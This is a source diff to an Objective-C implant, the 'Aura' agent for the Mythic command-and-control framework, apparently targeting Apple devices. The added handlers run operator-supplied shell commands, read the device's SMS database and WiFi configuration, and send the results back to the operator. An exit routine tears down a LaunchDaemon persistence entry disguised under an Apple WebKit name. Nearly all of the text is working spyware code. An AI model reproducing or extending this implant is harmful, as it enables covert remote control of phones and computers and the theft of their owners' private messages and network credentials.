@@ -1,11 +1,16 @@
-#import <Foundation/Foundation.h>
 #import "C2Task.h"
 #import "HTTPC2Config.h"
 #import "C2CheckIn.h"
 #import "NSTask.h"
+#import "SystemInfoHelper.h"
+#import "SMSReader.h"
+#import "WiFiConfigReader.h"
 
 @implementation C2Task
 
+
+/// Create a new task object with the params specified by the
+/// Mythic operator.
 - (instancetype)initWithDictionary:(NSDictionary *)dict {
     self = [super init];
     if (self) {
@@ -18,56 +23,148 @@
 }
 
 - (void)executeTask {
-    NSLog(@"[DEBUG] Executing task: %@", self.command);
-
-    // Dictionary mapping command strings to blocks (similar to a switch case)
+    NSLog(@"[DEBUG] 💥 Executing task: %@", self.command);
     NSDictionary<NSString *, void (^)(void)> *taskCommandMap = @{
-        @"take_screenshot": ^{
-            NSString *responseMessage = [NSString stringWithFormat:@"Screenshot taken at %@", self.parameters];
-            [self submitTaskResponseWithOutput:responseMessage status:@"success" completed:YES];
+        @"exit": ^{
+            BOOL deletionSuccess = [SystemInfoHelper uninstallAgent];
+            NSString *responseMessage = deletionSuccess ? @"🗑️ Aura payload deleted..." : @"❌ Error deleting the Aura payload.";
+            NSString *status = deletionSuccess ? @"success" : @"error";
+            [self submitTaskResponseWithOutput:responseMessage status:status completed:NO];
+
+            // Remove persistence if running as root
+            if ([SystemInfoHelper isRootUser]) {
+                NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
+                NSFileManager *fileManager = [NSFileManager defaultManager];
+                
+                if ([fileManager fileExistsAtPath:plistPath]) {
+                    NSLog(@"Removing plist at path: %@", plistPath);
+                    NSError *removeError = nil;
+                    [fileManager removeItemAtPath:plistPath error:&removeError];
+                    if (removeError) {
+                        [self submitTaskResponseWithOutput:[NSString stringWithFormat:@"❌ Error deleting plist: %@", removeError.localizedDescription] status:@"error" completed:NO];
+                    } else {
+                        [self submitTaskResponseWithOutput:@"\n📋 Backing LaunchDaemon plist deleted..." status:@"success" completed:NO];
+                    }
+                } else {
+                    NSLog(@"Plist not found at path: %@", plistPath);
+                }
+
+                // Final success message
+                [self submitTaskResponseWithOutput:@"\n✅ Aura Agent successfully uninstalled!" status:@"success" completed:YES];
+
+                // // Remove the agent from launchd
+                NSTask *removeTask = [[NSTask alloc] init];
+                removeTask.launchPath = @"/bin/launchctl";
+                removeTask.arguments = @[@"remove", @"com.apple.WebKit.Networking"];
+                [removeTask launch];
+                [removeTask waitUntilExit];
+
+                if (removeTask.terminationStatus != 0) {
+                    [self submitTaskResponseWithOutput:@"❌ Error removing the Aura Agent from launchd!" status:@"error" completed:YES];
+                    exit(1);
+                } else {
+                    [self submitTaskResponseWithOutput:@"\n🛜 Removed the Aura Agent from launchd." status:@"success" completed:NO];
+                }
+
+                // Unload the agent using launchctl
+                // [self submitTaskResponseWithOutput:@"\n🛜 Unloading the Aura Agent... this will halt C2 comms" status:@"success" completed:YES];
+                // NSTask *unloadTask = [[NSTask alloc] init];
+                // unloadTask.launchPath = @"/bin/launchctl";
+                // unloadTask.arguments = @[@"unload", @"-w", plistPath];
+                // [unloadTask launch];
+                // [unloadTask waitUntilExit];
+
+                if (removeTask.terminationStatus != 0) {
+                    [self submitTaskResponseWithOutput:@"❌ Error unloading the Aura Agent!" status:@"error" completed:YES];
+                    exit(1);
+                }
+            }
+
+            exit(0);
         },
-        @"shell_execution": ^{
+        @"take_screenshot": ^{
+            // TODO: Not implemented
+            [SystemInfoHelper takeScreenshotWithTask:self];
+        },
+        @"shell_exec": ^{
             @try {
-                // Create an NSTask for shell execution
                 NSTask *task = [[NSTask alloc] init];
-                NSPipe *outputPipe = [NSPipe pipe];  // Pipe for capturing output
+                NSPipe *outputPipe = [NSPipe pipe];
 
-                // Set the executable to /bin/zsh
                 task.launchPath = @"/bin/bash";
-                // Pass the command to execute as an argument
                 task.arguments = @[@"-c", self.parameters];
-                // Set the standard output to the pipe
                 task.standardOutput = outputPipe;
-
-                // Launch the task
                 [task launch];
-                [task waitUntilExit];  // Wait for task to complete
+                [task waitUntilExit];
 
-                // Read the output data from the pipe
                 NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
                 NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
 
                 if (task.terminationStatus == 0) {
-                    // If the task succeeded, return the output
                     [self submitTaskResponseWithOutput:outputString status:@"success" completed:YES];
                 } else {
-                    // If the task failed, return the error output
                     NSString *errorMessage = [NSString stringWithFormat:@"Shell execution failed with status: %d", task.terminationStatus];
                     [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
                 }
             }
             @catch (NSException *exception) {
-                // Catch any exceptions and return them as error output
+                NSString *errorMessage = [NSString stringWithFormat:@"Exception caught: %@", exception.reason];
+                [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
+            }
+        },
+        @"messages": ^{
+            SMSReader *reader = [[SMSReader alloc] init];
+            NSString *jsonResult = [reader fetchMessagesAsJSONFromDatabase:@"/var/mobile/Library/SMS/sms.db"];
+
+            if (jsonResult) {
+                NSLog(@"Messages JSON: %@", jsonResult);
+                [self submitTaskResponseWithOutput:jsonResult status:@"success" completed:YES];
+            } else {
+                NSLog(@"Failed to fetch messages.");
+                [self submitTaskResponseWithOutput:jsonResult status:@"error" completed:YES];
+            }
+        },
+        @"wifi_config": ^{
+            WiFiConfigReader *reader = [[WiFiConfigReader alloc] init];
+            NSString *jsonResult = [reader readWiFiConfigAsJSONFromPlist:@"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist"];
+
+            if (jsonResult) {
+                NSLog(@"WiFi Config JSON: %@", jsonResult);
+                [self submitTaskResponseWithOutput:jsonResult status:@"success" completed:YES];
+            } else {
+                NSLog(@"Failed to fetch WiFi config.");
+                [self submitTaskResponseWithOutput:@"Failed to read WiFi config." status:@"error" completed:YES];
+            }
+        },
+        @"ls": ^{
+            @try {
+                NSTask *task = [[NSTask alloc] init];
+                NSPipe *outputPipe = [NSPipe pipe];
+
+                task.launchPath = @"/bin/bash";
+                task.arguments = @[@"-c", @"ls", self.parameters];
+                task.standardOutput = outputPipe;
+                [task launch];
+                [task waitUntilExit];
+
+                NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
+                NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
+
+                if (task.terminationStatus == 0) {
+                    [self submitTaskResponseWithOutput:outputString status:@"success" completed:YES];
+                } else {
+                    NSString *errorMessage = [NSString stringWithFormat:@"ls execution failed with status: %d", task.terminationStatus];
+                    [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
+                }
+            }
+            @catch (NSException *exception) {
                 NSString *errorMessage = [NSString stringWithFormat:@"Exception caught: %@", exception.reason];
                 [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
             }
         }
-
     };
 
-    // Fetch the block for the command, or return an error if not found
     void (^taskBlock)(void) = taskCommandMap[self.command];
-    
     if (taskBlock) {
         taskBlock();
     } else {
@@ -83,6 +180,8 @@
         return;
     }
 
+    /// Construct the response for the executed task that we'll send back
+    /// to Mythic.
     NSDictionary *responseData = @{
         @"action": @"post_response",
         @"responses": @[
